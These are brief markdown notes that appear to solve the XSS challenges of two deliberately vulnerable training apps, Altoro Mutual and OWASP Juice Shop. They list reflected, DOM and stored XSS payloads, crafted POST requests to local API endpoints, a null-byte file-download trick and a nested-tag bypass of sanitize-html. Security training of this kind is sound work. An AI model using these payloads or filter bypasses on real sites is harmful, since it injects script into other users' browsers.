# XSS

## Altoro Mutual
#### Reflective XSS
* Search for `<svg/onload=alert(1)>`

## Juice Shop

### Perform a reflected XSS attack with <script>alert("XSS")</script>.
* Search
* Track Orders
### Perform a DOM XSS attack with <script>alert("XSS")</script>.	

#### Perform a persisted XSS attack with <script>alert("XSS")</script> bypassing a client-side security mechanism.
* Submit a POST request to http://localhost:3000/api/Users with
* Content-Type: application/json

* Post Params
  * {"email": "<script>alert(\"XSS\")</script>", "password": "anything"}
  
#### Perform a persisted XSS attack with <script>alert("XSS")</script> without using the frontend application at all.	

* Be authenticated
* Copy your Authorization header from an HTTP request submitted via browser.
* Submit a POST request to http://localhost:3000/api/Products with
* {"name": "XSS Juice", "description": "<script>alert(\"XSS\")</script>", "price": 23.99} as body,
* Content-Type: application/json
* Bearer ? as Authorization header, replacing the ? with the token you copied from the browser.

#### Perform a persisted XSS attack with <script>alert("XSS")</script> bypassing a server-side security mechanism.
* Download http://localhost:3000/ftp/package.json.bak%2500.md
* change to package.json
* run dependency-check against the package.json
* sanitize:1.4.2 has a xss vuln. https://github.com/punkave/sanitize-html/issues/29
* Visit http://localhost:3000/#/contact.
* Enter <<script>XSS</script>script>alert("XSS")<</script>/script> as Comment
* Choose a rating and click Submit
* Visit http://localhost:3000/#/about for a first "XSS" alert (from the Customer Feedback slideshow)




